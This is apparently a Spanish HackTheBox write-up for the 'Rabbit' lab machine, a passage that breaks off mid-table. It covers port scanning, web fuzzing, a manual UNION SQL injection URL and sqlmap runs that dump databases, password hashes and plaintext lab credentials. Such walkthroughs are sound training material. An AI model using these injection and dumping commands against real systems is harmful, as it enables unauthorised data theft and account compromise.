---
layout: post
title: Rabbit
date: 2023-03-14
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Rabbit-htb/Rabbit.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.71 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 11:34 GMT
Nmap scan report for 10.10.10.71
Host is up (0.072s latency).
Not shown: 65071 closed tcp ports (reset), 414 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
587/tcp   open  submission
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
808/tcp   open  ccproxy-http
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3306/tcp  open  mysql
5722/tcp  open  msdfsr
5985/tcp  open  wsman
6001/tcp  open  X11:1
6002/tcp  open  X11:2
6003/tcp  open  X11:3
6004/tcp  open  X11:4
6005/tcp  open  X11:5
6006/tcp  open  X11:6
6007/tcp  open  X11:7
6008/tcp  open  X11:8
6010/tcp  open  x11
6011/tcp  open  x11
6144/tcp  open  statsci1-lm
8080/tcp  open  http-proxy
9389/tcp  open  adws
9545/tcp  open  unknown
9551/tcp  open  unknown
9555/tcp  open  trispen-sra
9570/tcp  open  unknown
9576/tcp  open  unknown
9586/tcp  open  unknown
9603/tcp  open  unknown
9620/tcp  open  unknown
9633/tcp  open  unknown
9644/tcp  open  unknown
9646/tcp  open  unknown
9647/tcp  open  unknown
9662/tcp  open  unknown
9675/tcp  open  unknown
9689/tcp  open  unknown
9700/tcp  open  board-roar
47001/tcp open  winrm
64327/tcp open  unknown
64337/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p25,53,80,88,135,389,443,445,464,587,593,636,808,3268,3269,3306,5722,5985,6001,6002,6003,6004,6005,6006,6007,6008,6010,6011,6144,8080,9389,9545,9551,9555,9570,9576,9586,9603,9620,9633,9644,9646,9647,9662,9675,9689,9700,47001,64327,64337 10.10.10.71 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 11:36 GMT
Nmap scan report for 10.10.10.71
Host is up (1.2s latency).

PORT      STATE SERVICE              VERSION
25/tcp    open  smtp                 Microsoft Exchange smtpd
| smtp-commands: Rabbit.htb.local Hello [10.10.16.11], SIZE, PIPELINING, DSN, ENHANCEDSTATUSCODES, X-ANONYMOUSTLS, AUTH NTLM, X-EXPS GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, XEXCH50, XRDST, XSHADOW
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
53/tcp    open  domain               Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
80/tcp    open  http                 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 403 - Forbidden: Access is denied.
88/tcp    open  kerberos-sec         Microsoft Windows Kerberos (server time: 2023-03-14 16:37:00Z)
135/tcp   open  msrpc                Microsoft Windows RPC
389/tcp   open  ldap                 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http             Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
| ssl-cert: Subject: commonName=Rabbit
| Subject Alternative Name: DNS:Rabbit, DNS:Rabbit.htb.local
| Not valid before: 2017-10-24T17:56:42
|_Not valid after:  2022-10-24T17:56:42
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
|_http-title: IIS7
|_ssl-date: 2023-03-14T16:39:44+00:00; +4h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
587/tcp   open  smtp                 Microsoft Exchange smtpd
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| smtp-commands: Rabbit.htb.local Hello [10.10.16.11], SIZE 10485760, PIPELINING, DSN, ENHANCEDSTATUSCODES, AUTH GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT
593/tcp   open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
808/tcp   open  ccproxy-http?
3268/tcp  open  ldap                 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3306/tcp  open  mysql                MySQL 5.7.19
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.19
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: ODBCClient, IgnoreSpaceBeforeParenthesis, Support41Auth, ConnectWithDatabase, SupportsCompression, FoundRows, IgnoreSigpipes, SupportsLoadDataLocal, Speaks41ProtocolNew, Speaks41ProtocolOld, InteractiveClient, LongColumnFlag, SupportsTransactions, LongPassword, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x1A\x08G6B\x03T\x1CC\x083O\x1B}\x16At
| N\x18
|_  Auth Plugin Name: mysql_native_password
5722/tcp  open  msrpc                Microsoft Windows RPC
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6001/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6002/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6003/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6004/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6005/tcp  open  msrpc                Microsoft Windows RPC
6006/tcp  open  msrpc                Microsoft Windows RPC
6007/tcp  open  msrpc                Microsoft Windows RPC
6008/tcp  open  msrpc                Microsoft Windows RPC
6010/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6011/tcp  open  msrpc                Microsoft Windows RPC
6144/tcp  open  msrpc                Microsoft Windows RPC
8080/tcp  open  http                 Apache httpd 2.4.27 ((Win64) PHP/5.6.31)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Example
|_http-server-header: Apache/2.4.27 (Win64) PHP/5.6.31
9389/tcp  open  mc-nmf               .NET Message Framing
9545/tcp  open  msrpc                Microsoft Windows RPC
9551/tcp  open  msrpc                Microsoft Windows RPC
9555/tcp  open  msrpc                Microsoft Windows RPC
9570/tcp  open  msrpc                Microsoft Windows RPC
9576/tcp  open  msrpc                Microsoft Windows RPC
9586/tcp  open  msrpc                Microsoft Windows RPC
9603/tcp  open  msrpc                Microsoft Windows RPC
9620/tcp  open  msrpc                Microsoft Windows RPC
9633/tcp  open  msrpc                Microsoft Windows RPC
9644/tcp  open  msrpc                Microsoft Windows RPC
9646/tcp  open  msrpc                Microsoft Windows RPC
9647/tcp  open  msrpc                Microsoft Windows RPC
9662/tcp  open  msrpc                Microsoft Windows RPC
9675/tcp  open  msrpc                Microsoft Windows RPC
9689/tcp  open  msrpc                Microsoft Windows RPC
9700/tcp  open  msrpc                Microsoft Windows RPC
47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
64327/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
64337/tcp open  mc-nmf               .NET Message Framing
Service Info: Hosts: Rabbit.htb.local, RABBIT; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.90 seconds
```

Añado el dominio u subdominio ```htb.local``` y ```rabbit.htb.local``` al ```/etc/hosts```

## Puerto 53 (DNS)

Obtengo la dirección IPv6 aplicando consultas DNS

```null
nslookup
> server 10.10.10.71
Default server: 10.10.10.71
Address: 10.10.10.71#53
> rabbit.htb.local
;; communications error to 10.10.10.71#53: timed out
Server:		10.10.10.71
Address:	10.10.10.71#53

Name:	rabbit.htb.local
Address: 10.10.10.71
Name:	rabbit.htb.local
Address: dead:beef::787e:a286:d9b1:ef17
```

Hago otro escaneo con ```nmap``` pero por IPv6, pero son exactamente los mismos

## Puerto 443 (HTTPS)

La página ```https://rabbit``` se ve así:

<img src="/writeups/assets/img/Rabbit-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u https://rabbit/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -no-error -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://rabbit/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2023/03/14 12:06:16 Starting gobuster in directory enumeration mode
===============================================================
/public               [Size: 141] [--> https://rabbit/owa]
/exchange             [Size: 141] [--> https://rabbit/owa]
/Public               [Size: 141] [--> https://rabbit/owa]
/rpc                  [Size: 58]                          
/owa                  [Size: 0] [--> /owa/]               
/Exchange             [Size: 141] [--> https://rabbit/owa]
/ecp                  [Size: 126] [--> /ecp/]             
/RPC                  [Size: 58]                          
/ews                  [Size: 0]                           
/PUBLIC               [Size: 141] [--> https://rabbit/owa]
/exchweb              [Size: 141] [--> https://rabbit/owa]
                                                          
===============================================================
2023/03/14 12:13:54 Finished
===============================================================
```

Tengo acceso al OWA, pero no dispongo de credenciales, así que paso al puerto 8080

<img src="/writeups/assets/img/Rabbit-htb/2.png" alt="">

## Puerto 8080 (HTTP)

Con whatweb, analizo las tecnologías que está empleando el servidor web

La página principal se ve así:

<img src="/writeups/assets/img/Rabbit-htb/3.png" alt="">

```null
gobuster dir -u http://10.10.10.71:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 200 2>/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.71:8080/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/14 16:19:59 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 10065]
/Index                (Status: 200) [Size: 10065]
/favicon              (Status: 200) [Size: 202575]
/%20                  (Status: 403) [Size: 299]   
/INDEX                (Status: 200) [Size: 10065] 
/joomla               (Status: 301) [Size: 328] [--> http://10.10.10.71:8080/joomla/]
/*checkout*           (Status: 403) [Size: 308]                                      
/*checkout*.php       (Status: 403) [Size: 312]                                      
/complain             (Status: 301) [Size: 330] [--> http://10.10.10.71:8080/complain/]
/phpmyadmin           (Status: 403) [Size: 308]                                        
/*docroot*            (Status: 403) [Size: 307]                                        
/*docroot*.php        (Status: 403) [Size: 311]                                        
/*.php                (Status: 403) [Size: 303]                                        
/*                    (Status: 403) [Size: 299]                                        
/con                  (Status: 403) [Size: 301]                                        
/con.php              (Status: 403) [Size: 305]                                        
/http%3A              (Status: 403) [Size: 303]                                        
/http%3A.php          (Status: 403) [Size: 307]                                        
/**http%3a            (Status: 403) [Size: 305]                                        
/**http%3a.php        (Status: 403) [Size: 309]                                        
/*http%3A             (Status: 403) [Size: 304]                                        
/*http%3A.php         (Status: 403) [Size: 308]                                        
/Joomla               (Status: 301) [Size: 328] [--> http://10.10.10.71:8080/Joomla/]  
/aux                  (Status: 403) [Size: 301]                                        
/aux.php              (Status: 403) [Size: 305]                                        
/**http%3A            (Status: 403) [Size: 305]                                        
/**http%3A.php        (Status: 403) [Size: 309]                                        
/%C0.php              (Status: 403) [Size: 303]                                        
/%C0                  (Status: 403) [Size: 299]                                        
/phpsysinfo           (Status: 403) [Size: 308]                                        
/%3FRID%3D2671        (Status: 403) [Size: 307]                                        
/%3FRID%3D2671.php    (Status: 403) [Size: 311]                                        
/devinmoore*          (Status: 403) [Size: 309]                                        
/devinmoore*.php      (Status: 403) [Size: 313]                                        
```

Está desplegado un ```Joomla```

<img src="/writeups/assets/img/Rabbit-htb/4.png" alt="">

Lo dejo también, porque no tengo credenciales

Miro lo que hay en la ruta ```/complain```

<img src="/writeups/assets/img/Rabbit-htb/5.png" alt="">

Busco por vulnerabilidades para este servicio

```null
searchsploit complain
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Complain Management System - Hard-Coded Credentials / Blind SQL injection                                                                                                      | php/webapps/42968.txt
Complain Management System - SQL injection                                                                                                                                     | php/webapps/41131.txt
Complaint Management System 1.0 - 'cid' SQL Injection                                                                                                                          | php/webapps/48758.txt
Complaint Management System 1.0 - 'username' SQL Injection                                                                                                                     | php/webapps/48468.py
Complaint Management System 1.0 - Authentication Bypass                                                                                                                        | php/webapps/48452.txt
Complaint Management System 4.0 - 'cid' SQL injection                                                                                                                          | php/webapps/47847.txt
Complaint Management System 4.0 - Remote Code Execution                                                                                                                        | php/webapps/47884.py
Complaint Management System 4.2 - Authentication Bypass                                                                                                                        | php/webapps/48371.txt
Complaint Management System 4.2 - Cross-Site Request Forgery (Delete User)                                                                                                     | php/webapps/48372.txt
Complaint Management System 4.2 - Persistent Cross-Site Scripting                                                                                                              | php/webapps/48370.txt
Complaints Report Management System 1.0 - 'username' SQL Injection / Remote Code Execution                                                                                     | php/webapps/48985.txt
Consumer Complaints Clone Script 1.0 - 'id' SQL Injection                                                                                                                      | php/webapps/43274.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Una es una inyección SQL en la que se filtran credenciales, pero de momento no puedo hacer nada, ya que esa ruta me aplica un redirect

<img src="/writeups/assets/img/Rabbit-htb/7.png" alt="">

Me puedo registrar

<img src="/writeups/assets/img/Rabbit-htb/6.png" alt="">

Como estoy registrado, puedo ver una nueva interfaz

<img src="/writeups/assets/img/Rabbit-htb/8.png" alt="">

Pruebo a efectuar la inyección SQL

```null
http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%27--%20-
```

<img src="/writeups/assets/img/Rabbit-htb/9.png" alt="">

El total es de 4 columnas. El error desaparece en este caso

```null
http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20union%20select%201,2,3,4--%20-
```

<img src="/writeups/assets/img/Rabbit-htb/10.png" alt="">

En caso de al hacer el union introducir una columna de más, aparece lo siguiente:

<img src="/writeups/assets/img/Rabbit-htb/11.png" alt="">

Utilizo ```SQLMap``` para automatizar las inyecciones. Enumero las bases de datos existentes

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 --dbs --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

available databases [7]:
[*] complain
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] secret
[*] sys
```

Para la base de datos ```complain```, listo las tablas

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 -D complain --tables --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: complain
[5 tables]
+---------------+
| tbl_complains |
| tbl_customer  |
| tbl_engineer  |
| tbl_plans     |
| tbl_supplier  |
+---------------+
```

Dumpeo todos los datos

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 -D complain --dump --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

+-----+--------+---------+----------+----------------+------------------------------------------------------------------------------------------------------------------------------+-----------+---------------+---------------------+-----------------------------------+---------------------+--------------------------------------------------------+
| cid | eng_id | cust_id | status   | eng_name       | comp_desc                                                                                                                    | comp_type | cust_name     | close_date          | comp_title                        | create_date         | eng_comment                                            |
+-----+--------+---------+----------+----------------+------------------------------------------------------------------------------------------------------------------------------+-----------+---------------+---------------------+-----------------------------------+---------------------+--------------------------------------------------------+
| 2   | 1      | 2       | close    | Prashant Kumar | Hi.\r\n\r\nMy machine is making to much noice, will u plz assist.\r\n\r\nthanks                                              | hardware  | ayesha khan   | 0000-00-00 00:00:00 | my machine is making noice.       | 2010-11-27 18:59:12 | working on it.                                         |
| 3   | 2      | 2       | close    | Aijaz Aslam    | Hi.\r\n\r\nMS Office is not working. i think its a problem of virus.\r\nplease help.\r\n\r\nThanks                           | software  | ayesha khan   | 0000-00-00 00:00:00 | MS Office is not working          | 2010-11-27 19:04:14 | poblem of virus. working on it.\r\nwill need some time |
| 4   | 5      | 1       | assigned | Ramiz Khan     | Hello.\r\n\r\nI am unable to connect to 10.88.29.098. their is a problem in LAN. Please do needful.\r\n\r\nRegards\r\nRizwan | network   | rizwan khatik | 0000-00-00 00:00:00 | Unable to connect                 | 2010-11-27 19:30:10 | <blank>                                                |
| 6   | 1      | 1       | working  | Prashant Kumar | Hi. \r\nMy internate connection is very slow.\r\n                                                                            | network   | rizwan khatik | 0000-00-00 00:00:00 | Internet is very slow             | 2010-11-28 09:26:36 | Working on it                                          |
| 7   | 3      | 3       | close    | Atul Nigade    | hi,\r\nms office is not working fine. may be a problem of virus,\r\n\r\nplz assist.\r\n\r\nheena                             | software  | heena         | 0000-00-00 00:00:00 | MS Office is not working          | 2010-11-28 14:08:49 | complain is resloved                                   |
| 8   | 3      | 1       | working  | Atul Nigade    | Hello.\r\n\r\nI have problem in my monitor\r\nplz assist\r\n\r\nrizwan                                                       | hardware  | rizwan khatik | 0000-00-00 00:00:00 | My monitor is not getting display | 2010-12-07 21:49:38 | i am working on it                                     |
| 9   | 0      | 6       | open     | <blank>        | hello,\r\n\r\nmy setup box is not working well. please assist.\r\n\r\nThanks                                                 | software  | asif          | 0000-00-00 00:00:00 | My setup box is not working       | 2012-02-05 17:35:36 | <blank>                                                |
| 10  | 0      | 6       | open     | <blank>        | <blank>                                                                                                                      | hardware  | asif          | 0000-00-00 00:00:00 | <blank>                           | 2012-03-24 10:02:18 | <blank>                                                |
| 11  | 5      | 1       | assigned | Ramiz Khan     | Facing problem in installation of WLAN. Pls assist.                                                                          | software  | rizwan khatik | 0000-00-00 00:00:00 | problem in installation           | 2013-11-29 09:48:32 | <blank>                                                |
+-----+--------+---------+----------+----------------+------------------------------------------------------------------------------------------------------------------------------+-----------+---------------+---------------------+-----------------------------------+---------------------+--------------------------------------------------------+

Database: complain
Table: tbl_customer
[4 entries]
+-----+----------------+----------+--------------------+------------------------------------------------------+------------+---------------------+
| cid | cname          | cpass    | email              | address                                              | c_mobile   | date_time           |
+-----+----------------+----------+--------------------+------------------------------------------------------+------------+---------------------+
| 1   | rizwan khatik  | riz123   | riz1.a@gmail.com   | \t\t\t  3, Hill side, Bhaguday Nagar, Kondwa\t\t\t   | 9089789876 | 2010-11-27 12:55:39 |
| 4   | Manmohan Singh | mansingh | man.mohan@yo.com   | 10, raj bhavan                                       | 9652525252 | 2011-02-02 23:52:36 |
| 5   | Sardar         | sar1     | sardar.p@yahoo.com | 11, ashoka heights, kondwa, pune                     | 9521425425 | 2011-02-03 07:45:47 |
| 7   | rubbx          | rubbx    | rubbx@rubbx.com    | rubbx                                                | 1234567890 | 2023-03-14 18:21:36 |
+-----+----------------+----------+--------------------+------------------------------------------------------+------------+---------------------+

Database: complain
Table: tbl_supplier
[1 entry]
+-----+------------------------+--------------+----------+-----------------------+------------+---------------------+
| sid | email                  | sname        | spass    | address               | s_mobile   | date_time           |
+-----+------------------------+--------------+----------+-----------------------+------------+---------------------+
| 1   | maryam.afifa@gmail.com | maryam afifa | marry123 | 290, shani peth, pune | 9987876765 | 2010-11-27 17:29:05 |
+-----+------------------------+--------------+----------+-----------------------+------------+---------------------+

Database: complain
Table: tbl_plans
[2 entries]
+----+-----+-----+--------------------------+-----------+
| id | cid | amt | plans                    | plan_date |
+----+-----+-----+--------------------------+-----------+
| 3  | 5   | 150 | Basic Plan, Music Plan,  | 13        |
| 4  | 6   | 120 | Basic Plan,              | 05        |
+----+-----+-----+--------------------------+-----------+

Database: complain
Table: tbl_engineer
[3 entries]
+-----+----------------------+-----------------+---------+----------------------------------+------------+---------------------+
| eid | email                | ename           | epass   | address                          | e_mobile   | date_time           |
+-----+----------------------+-----------------+---------+----------------------------------+------------+---------------------+
| 4   | mubarak@gmail.com    | Mubarak Bahesti | mubarak | 290, asif nagar, pune            | 9856323568 | 2011-02-02 23:15:20 |
| 5   | ramiz@gmail.com      | Ramiz Khan      | ramiz   | 10, merta tower                  | 9854251425 | 2011-02-02 23:36:09 |
| 6   | amol.sarode@gmail.co | Amol sarode     | amol    | \t\t\t  12/c, camp, pune\t\t\t   | 2541258452 | 2011-02-02 23:36:51 |
+-----+----------------------+-----------------+---------+----------------------------------+------------+---------------------+
```

Pero aquí no hay nada que me pueda servir, así que paso a dumpear los datos de la base de datos ```joomla```

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 -D joomla --tables --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: joomla
[72 tables]
+-------------------------------+
| llhe4_assets                  |
| llhe4_associations            |
| llhe4_banner_clients          |
| llhe4_banner_tracks           |
| llhe4_banners                 |
| llhe4_categories              |
| llhe4_contact_details         |
| llhe4_content                 |
| llhe4_content_frontpage       |
| llhe4_content_rating          |
| llhe4_content_types           |
| llhe4_contentitem_tag_map     |
| llhe4_core_log_searches       |
| llhe4_extensions              |
| llhe4_fields                  |
| llhe4_fields_categories       |
| llhe4_fields_groups           |
| llhe4_fields_values           |
| llhe4_finder_filters          |
| llhe4_finder_links            |
| llhe4_finder_links_terms0     |
| llhe4_finder_links_terms1     |
| llhe4_finder_links_terms2     |
| llhe4_finder_links_terms3     |
| llhe4_finder_links_terms4     |
| llhe4_finder_links_terms5     |
| llhe4_finder_links_terms6     |
| llhe4_finder_links_terms7     |
| llhe4_finder_links_terms8     |
| llhe4_finder_links_terms9     |
| llhe4_finder_links_termsa     |
| llhe4_finder_links_termsb     |
| llhe4_finder_links_termsc     |
| llhe4_finder_links_termsd     |
| llhe4_finder_links_termse     |
| llhe4_finder_links_termsf     |
| llhe4_finder_taxonomy         |
| llhe4_finder_taxonomy_map     |
| llhe4_finder_terms            |
| llhe4_finder_terms_common     |
| llhe4_finder_tokens           |
| llhe4_finder_tokens_aggregate |
| llhe4_finder_types            |
| llhe4_languages               |
| llhe4_menu                    |
| llhe4_menu_types              |
| llhe4_messages                |
| llhe4_messages_cfg            |
| llhe4_modules                 |
| llhe4_modules_menu            |
| llhe4_newsfeeds               |
| llhe4_overrider               |
| llhe4_postinstall_messages    |
| llhe4_redirect_links          |
| llhe4_schemas                 |
| llhe4_session                 |
| llhe4_tags                    |
| llhe4_template_styles         |
| llhe4_ucm_base                |
| llhe4_ucm_content             |
| llhe4_ucm_history             |
| llhe4_update_sites            |
| llhe4_update_sites_extensions |
| llhe4_updates                 |
| llhe4_user_keys               |
| llhe4_user_notes              |
| llhe4_user_profiles           |
| llhe4_user_usergroup_map      |
| llhe4_usergroups              |
| llhe4_users                   |
| llhe4_utf8_conversion         |
| llhe4_viewlevels              |
+-------------------------------+
```

Me interesan solo aquello relacionado con los usuarios

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 -D joomla -T llhe4_users --columns --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: joomla
Table: llhe4_users
[16 columns]
+---------------+---------------+
| Column        | Type          |
+---------------+---------------+
| activation    | varchar(100)  |
| block         | tinyint(4)    |
| email         | varchar(100)  |
| id            | int(11)       |
| lastResetTime | datetime      |
| lastvisitDate | datetime      |
| name          | varchar(400)  |
| otep          | varchar(1000) |
| otpKey        | varchar(1000) |
| params        | text          |
| password      | varchar(100)  |
| registerDate  | datetime      |
| requireReset  | tinyint(4)    |
| resetCount    | int(11)       |
| sendEmail     | tinyint(4)    |
| username      | varchar(150)  |
+---------------+---------------+
```

Obtengo un hash

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 -D joomla -T llhe4_users -C email,password --dump --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


Database: joomla
Table: llhe4_users
[1 entry]
+-----------------+--------------------------------------------------------------+
| email           | password                                                     |
+-----------------+--------------------------------------------------------------+
| admin@htb.local | $2y$10$VLBp76ziPXq4gxiLcMwp..mCFUckRotLYcygpsAUiDBg0rjHFyaQ6 |
+-----------------+--------------------------------------------------------------+
```

Pero no se puede crackear. Listo las tablas para la base de datos ```secret```

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 -D secret --tables --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: secret
[1 table]
+-------+
| users |
+-------+
```

Dumpeo todos los datos

```null
sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans%20' --cookie=8e3390591191591f0578d77b26fb406e=427o5tmub1u1v11qfs8393c8l1 --cookie=PHPSESSID=2iq1dlto43n3s9ipbkctm3qjs0 -D secret -T users --dump --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: secret                                                                                                                                                                                               
Table: users
[10 entries]
+--------------------------------------------------+----------+
| Password                                         | Username |
+--------------------------------------------------+----------+
| 13fa8abd10eed98d89fd6fc678afaf94                 | Zephon   |
| 33903fbcc0b1046a09edfaa0a65e8f8c                 | Kain     |
| 33da7a40473c1637f1a2e142f4925194 (popcorn)       | Dumah    |
| 370fc3559c9f0bff80543f2e1151c537                 | Magnus   |
| 719da165a626b4cf23b626896c213b84                 | Raziel   |
